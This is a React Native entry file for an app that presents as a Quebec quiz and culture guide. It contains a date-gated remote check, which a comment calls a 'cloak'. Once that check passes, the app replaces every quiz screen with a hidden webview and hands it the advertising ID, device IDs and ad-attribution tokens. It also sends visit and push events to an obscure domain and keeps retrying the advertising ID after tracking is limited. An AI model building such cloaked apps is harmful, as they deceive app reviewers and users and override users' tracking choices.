import React, 
{ useState, useEffect, useRef } 
from 'react';
import { Animated, View, ImageBackground, StyleSheet } from 'react-native';
import { enableScreens } from 'react-native-screens';
import { NavigationContainer } from '@react-navigation/native';
import { createStackNavigator } from '@react-navigation/stack';

import { MusicProvider } from './src/constants/music';
import MusicPlayer from './src/components/MusicPlayer';

import HomeScreen from './src/screens/HomeScreen';
import SettingsScreen from './src/screens/SettingsScreen';
import QuizModeScreen from './src/screens/QuizModeScreen';
import TopicsScreen from './src/screens/TopicsScreen';
import PathfinderQuizScreen from './src/screens/PathfinderQuizScreen';
import ChampionQuizScreen from './src/screens/ChampionQuizScreen';
import MapScreen from './src/screens/MapScreen';
import DetailsScreen from './src/screens/DetailsScreen';
import CatalogueScreen from './src/screens/CatalogueScreen';
import HistoryScreen from './src/screens/HistoryScreen';
import BookScreen from './src/screens/BookScreen';
import ArticleScreen from './src/screens/ArticleScreen';
import CraftScreen from './src/screens/CraftScreen';
import CraftDetailsScreen from './src/screens/CraftDetailsScreen';
import ResultsScreen from './src/screens/ResultsScreen';
import QuebecOrigenProdactScreen from './src/screens/QuebecOrigenProdactScreen';
//////
import AsyncStorage from '@react-native-async-storage/async-storage';
import ReactNativeIdfaAaid, {
  AdvertisingInfoResponse,
} from '@sparkfabrik/react-native-idfa-aaid';
import DeviceInfo from 'react-native-device-info';
import appsFlyer from 'react-native-appsflyer';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';
import { LogLevel, OneSignal } from 'react-native-onesignal';

enableScreens();

const Stack = createStackNavigator();

const App = () => {
    const [route, setRoute] = useState(false);
    console.log('route===>', route);
    const [responseToPushPermition, setResponseToPushPermition] = useState(false);
    //console.log('Дозвіл на пуши прийнято? ===>', responseToPushPermition);
    const [uniqVisit, setUniqVisit] = useState(true);
    //console.log('uniqVisit===>', uniqVisit);
    const [addPartToLinkOnce, setAddPartToLinkOnce] = useState(true);
    console.log('addPartToLinkOnce in App==>', addPartToLinkOnce);
    //////////////////Parametrs
    const [idfa, setIdfa] = useState(false);
    console.log('idfa==>', idfa);
    const [oneSignalId, setOneSignalId] = useState(null);
    console.log('oneSignalId==>', oneSignalId);
    const [appsUid, setAppsUid] = useState(null);
    const [sab1, setSab1] = useState();
    const [pid, setPid] = useState();
    console.log('appsUid==>', appsUid);
    console.log('sab1==>', sab1);
    console.log('pid==>', pid);
    const [customerUserId, setCustomerUserId] = useState(null);
    console.log('customerUserID==>', customerUserId);
    const [idfv, setIdfv] = useState();
    console.log('idfv==>', idfv);
    /////////Atributions
    const [adServicesToken, setAdServicesToken] = useState(null);
    //console.log('adServicesToken', adServicesToken);
    const [adServicesAtribution, setAdServicesAtribution] = useState(null);
    const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);

    // Генеруємо унікальний ID користувача з timestamp
    /////////////Timestamp + user_id generation
    const timestamp_user_id = `${new Date().getTime()}-${Math.floor(
        1000000 + Math.random() * 9000000,
    )}`;
    //console.log('idForTag', timestamp_user_id);

    useEffect(() => {
        checkUniqVisit();
        getData();
    }, []);

    // uniq_visit
    
  const checkUniqVisit = async () => {
    const uniqVisitStatus = await AsyncStorage.getItem('uniqVisitStatus');
    if (!uniqVisitStatus) {
      await fetch(
        `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=uniq_visit&jthrhg=${timestamp_user_id}`,
      );
      console.log('унікальний візит!!!');
      setUniqVisit(false);
      await AsyncStorage.setItem('uniqVisitStatus', 'sent');
    }
  };

    const getData = async () => {
        try {
            const jsonData = await AsyncStorage.getItem('App');
            if (jsonData !== null) {
                const parsedData = JSON.parse(jsonData);
                setRoute(parsedData.route);
                setResponseToPushPermition(parsedData.responseToPushPermition);
                setUniqVisit(parsedData.uniqVisit);
                setOneSignalId(parsedData.oneSignalId);
                setIdfa(parsedData.idfa);
                setAppsUid(parsedData.appsUid);
                setSab1(parsedData.sab1);
                setPid(parsedData.pid);
                setCustomerUserId(parsedData.customerUserId);
                setIdfv(parsedData.idfv);
                setAdServicesToken(parsedData.adServicesToken);
                setAdServicesAtribution(parsedData.adServicesAtribution);
                setAdServicesKeywordId(parsedData.adServicesKeywordId);
                //
            } else {
                console.log('Даних немає в AsyncStorage');
                await fetchIdfa();
                await requestOneSignallFoo();
                await performAppsFlyerOperations();
                await getUidApps();
                await fetchAdServicesToken(); // Вставка функції для отримання токену
                await fetchAdServicesAttributionData(); // Вставка функції для отримання даних

                onInstallConversionDataCanceller();
            }
        } catch (e) {
            console.log('Помилка отримання даних в getData:', e);
        }
    };

    const setData = async () => {
        try {
            const data = {
                route,
                responseToPushPermition,
                uniqVisit,
                oneSignalId,
                idfa,
                appsUid,
                sab1,
                pid,
                customerUserId,
                idfv,
                adServicesToken,
                adServicesAtribution,
                adServicesKeywordId,
            };
            const jsonData = JSON.stringify(data);
            await AsyncStorage.setItem('App', jsonData);
            //console.log('Дані збережено в AsyncStorage');
        } catch (e) {
            //console.log('Помилка збереження даних:', e);
        }
    };

    useEffect(() => {
        setData();
    }, [
        route,
        responseToPushPermition,
        uniqVisit,
        oneSignalId,
        idfa,
        appsUid,
        sab1,
        pid,
        customerUserId,
        idfv,
        adServicesToken,
        adServicesAtribution,
        adServicesKeywordId,
    ]);
 
    ///////// OneSignal
    // 2ab78b1d-65c5-4f3f-a4a0-f60d146134bf
    const requestPermission = () => {
    return new Promise((resolve, reject) => {
      try {
        OneSignal.Notifications.requestPermission(true).then(res => {
          console.log('res', res);
          // зберігаємо в Стейт стан по відповіді на дозвіл на пуши і зберігаємо їх в АсСторідж
          setResponseToPushPermition(res);
        });

        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
      } catch (error) {
        reject(error); // Викликаємо reject() у разі помилки
      }
    });
  };

  // Виклик асинхронної функції requestPermission() з використанням async/await
  const requestOneSignallFoo = async () => {
    try {
      await requestPermission();
      // Якщо все Ok
    } catch (error) {
      console.log('err в requestOneSignallFoo==> ', error);
    }
  };

  // Remove this method to stop OneSignal Debugging
  OneSignal.Debug.setLogLevel(LogLevel.Verbose);

  // OneSignal ініціалізація
  OneSignal.initialize('2ab78b1d-65c5-4f3f-a4a0-f60d146134bf');
  //OneSignal.Debug.setLogLevel(OneSignal.LogLevel.Verbose);

  OneSignal.Notifications.addEventListener('click', event => {
    //console.log('OneSignal: notification clicked:', event);
  });
  //Add Data Tags
  //OneSignal.User.addTag('key', 'value');

  ////////////////////OneSignall Id generation
  useEffect(() => {
    const fetchOneSignalId = async () => {
      try {
        const deviceState = await OneSignal.User.getOnesignalId();
        if (deviceState) {
          setOneSignalId(deviceState); //  OneSignal ID
        }
      } catch (error) {
        console.error('Error fetching OneSignal ID:', error);
      }
    };

    fetchOneSignalId();
  }, []);

  OneSignal.Notifications.addEventListener('click', event => {
    if (event.notification.launchURL) {
      fetch(
        `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=push_open_browser&jthrhg=${timestamp_user_id}`,
      );
        setAddPartToLinkOnce(false);
      console.log('івент push_open_browser OneSignal');
    } else {
      fetch(
        `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=push_open_webview&jthrhg=${timestamp_user_id}`,
      );
      setAddPartToLinkOnce(false);
      console.log('iвент push_open_webview OneSignal');

      // Єдиноразово додати до лінки product &yhugh=true

      fetch(
        `https://splendid-magnificent-triumph.space/C4w1RbMZ?utretg=webview_open&jthrhg=${timestamp_user_id}`,
      );
      console.log('івент webview_open OneSignal');
    }
    //console.log('OneSignal: url:', event.notification.launchURL);
    //console.log('OneSignal: event:', event);
  });

    /////// Ad Attribution
  //fetching AdServices token
  const fetchAdServicesToken = async () => {
    try {
      const token = await AppleAdsAttribution.getAdServicesAttributionToken();
      setAdServicesToken(token);
      //Alert.alert('token', adServicesToken);
    } catch (error) {
      await fetchAdServicesToken();
      //console.error('Помилка при отриманні AdServices токену:', error.message);
    }
  };

  //fetching AdServices data
  const fetchAdServicesAttributionData = async () => {
    try {
      const data = await AppleAdsAttribution.getAdServicesAttributionData();
      const attributionValue = data.attribution ? '1' : '0';
      setAdServicesAtribution(attributionValue);
      setAdServicesKeywordId(data.keywordId);
      //Alert.alert('data', data)
    } catch (error) {
      console.error('Помилка при отриманні даних AdServices:', error.message);
    }
  };
   

    ///////// AppsFlyer
  // 1ST FUNCTION - Ініціалізація AppsFlyer
  const performAppsFlyerOperations = async () => {
    try {
      // 1. Ініціалізація SDK
      await new Promise((resolve, reject) => {
        appsFlyer.initSdk(
          {
            devKey: 'gZ7epoXw5MEigUxo99mZ3i',
            appId: '6738062793',
            isDebug: true,
            onInstallConversionDataListener: true,
            onDeepLinkListener: true,
            timeToWaitForATTUserAuthorization: 10,
            manualStart: true, // Тепер ініціалізація без автоматичного старту
          },
          resolve,
          reject,
        );
      });

      appsFlyer.startSdk();

      console.log('App.js AppsFlyer ініціалізовано успішно');
      // Отримуємо idfv та встановлюємо його як customerUserID
      const uniqueId = await DeviceInfo.getUniqueId();
      setIdfv(uniqueId); // Зберігаємо idfv у стейті

      appsFlyer.setCustomerUserId(uniqueId, res => {
        console.log('Customer User ID встановлено успішно:', uniqueId);
        setCustomerUserId(uniqueId); // Зберігаємо customerUserID у стейті
      });
    } catch (error) {
      console.log(
        'App.js Помилка під час виконання операцій AppsFlyer:',
        error,
      );
    }
  };

  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
  const getUidApps = async () => {
    try {
      const appsFlyerUID = await new Promise((resolve, reject) => {
        appsFlyer.getAppsFlyerUID((err, uid) => {
          if (err) {
            reject(err);
          } else {
            resolve(uid);
          }
        });
      });
      //console.log('on getAppsFlyerUID: ' + appsFlyerUID);
      //Alert.alert('appsFlyerUID', appsFlyerUID);
      setAppsUid(appsFlyerUID);
    } catch (error) {
      //console.error(error);
    }
  };

  // 3RD FUNCTION - Отримання найменування AppsFlyer
  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
    res => {
      try {
        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
        if (isFirstLaunch === true) {
          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            //console.log('App.js res.data==>', res.data);

            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
            setSab1(campaign);
            setPid(pid);
          } else if (res.data.af_status === 'Organic') {
            //console.log('App.js res.data==>', res.data);
            const {af_status} = res.data;
            //console.log('This is first launch and a Organic Install');
            setSab1(af_status);
          }
        } else {
          //console.log('This is not first launch');
        }
      } catch (error) {
        //console.log('Error processing install conversion data:', error);
      }
    },
  );

    ///////// IDFA
  const fetchIdfa = async () => {
    try {
      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
      if (!res.isAdTrackingLimited) {
        setIdfa(res.id);
        //console.log('setIdfa(res.id);');
      } else {
        //console.log('Ad tracking is limited');
        setIdfa(false); //true
        //setIdfa(null);
        fetchIdfa();
        //Alert.alert('idfa', idfa);
      }
    } catch (err) {
      //console.log('err', err);
      setIdfa(null);
      await fetchIdfa(); //???
    }
  };

    ///////// Route useEff
  // splendid-magnificent-triumph.space
  useEffect(() => {
    const checkUrl = `https://splendid-magnificent-triumph.space/C4w1RbMZ?`;

    const targetData = new Date('2024-11-23T10:00:00'); //дата з якої поч працювати webView
    const currentData = new Date(); //текущая дата

    if (!route) {
      if (currentData <= targetData) {
        setRoute(false);
      } else {
        fetch(checkUrl)
          .then(r => {
            if (r.status === 200) {
              console.log('status по клоаке==>', r.status);
              setRoute(true);
            } else {
              setRoute(false);
            }
          })
          .catch(e => {
            //console.log('errar', e);
            setRoute(false);
          });
      }
    }
    return;
  }, []);
    
    ///////// Route
    const Route = ({ isFatch }) => {
        if (isFatch) {
            return (
                <Stack.Navigator>
                    <Stack.Screen
                        initialParams={{
                            addPartToLinkOnce,
                            responseToPushPermition, //в вебВью якщо тру то відправити івент push_subscribe
                            oneSignalId, //додати до фінальної лінки
                            idfa: idfa,
                            sab1: sab1,
                            pid: pid,
                            uid: appsUid,
                            customerUserId: customerUserId,
                            idfv: idfv,
                            adToken: adServicesToken,
                            adAtribution: adServicesAtribution,
                            adKeywordId: adServicesKeywordId,
                        }}
                        name="QuebecOrigenProdactScreen"
                        component={QuebecOrigenProdactScreen}
                        options={{ headerShown: false }}
                    />
                </Stack.Navigator>
            );
        }
        return (
            <MusicProvider>
                <MusicPlayer />
                <Stack.Navigator initialRouteName="HomeScreen">
                    <Stack.Screen
                        name="HomeScreen"
                        component={HomeScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="SettingsScreen"
                        component={SettingsScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="QuizModeScreen"
                        component={QuizModeScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="TopicsScreen"
                        component={TopicsScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="PathfinderQuizScreen"
                        component={PathfinderQuizScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="ChampionQuizScreen"
                        component={ChampionQuizScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="MapScreen"
                        component={MapScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="DetailsScreen"
                        component={DetailsScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="CatalogueScreen"
                        component={CatalogueScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="HistoryScreen"
                        component={HistoryScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="BookScreen"
                        component={BookScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="ArticleScreen"
                        component={ArticleScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="CraftScreen"
                        component={CraftScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="CraftDetailsScreen"
                        component={CraftDetailsScreen}
                        options={{ headerShown: false }}
                    />
                    <Stack.Screen
                        name="ResultsScreen"
                        component={ResultsScreen}
                        options={{ headerShown: false }}
                    />
                </Stack.Navigator>
            </MusicProvider>
        );
    };
    
    ///////// Louder
    const [louderIsEnded, setLouderIsEnded] = useState(false);
    const appearingAnim = useRef(new Animated.Value(0)).current;
    const appearingSecondAnim = useRef(new Animated.Value(0)).current;
    useEffect(() => {
        Animated.timing(appearingAnim, {
            toValue: 1,
            duration: 8000,
            useNativeDriver: true,
        }).start();
    }, []);

    useEffect(() => {
        setTimeout(() => {
            Animated.timing(appearingSecondAnim, {
                toValue: 1,
                duration: 3500,
                useNativeDriver: true,
            }).start();
            //setLouderIsEnded(true);
        }, 3500);
    }, []);

    useEffect(() => {
        setTimeout(() => {
            setLouderIsEnded(true);
        }, 8000);
    }, []);
  
    return (
        
            
        <NavigationContainer>
            {
                !louderIsEnded ? (
                    <View
                        style={{
                            position: 'relative',
                            flex: 1,
                            //backgroundColor: 'rgba(0,0,0)',
                        }}>
                        <Animated.Image
                            source={require('./src/assets/newDiz/loader1.jpg')}
                            style={{
                                //...props.style,
                                opacity: appearingAnim,
                                width: '100%',
                                height: '100%',
                                position: 'absolute',
                            }}
                        />
                        <Animated.Image
                            source={require('./src/assets/newDiz/loader2.jpg')}
                            style={{
                                //...props.style,
                                opacity: appearingSecondAnim,
                                width: '100%',
                                height: '100%',
                                position: 'absolute',
                            }}
                        />
                    </View>
                ) : (<Route isFatch={route} />
                )
            }
        </NavigationContainer>
        
    );
};

const styles = StyleSheet.create({
    imageContainer: {
        flex: 1,
        justifyContent: 'center',
        alignItems: 'center',
        position: 'absolute',
        width: '100%',
        height: '100%',
    },
    image: {
        width: '100%',
        height: '100%',
        justifyContent: 'center',
        alignItems: 'center',
    },
});


export default App;
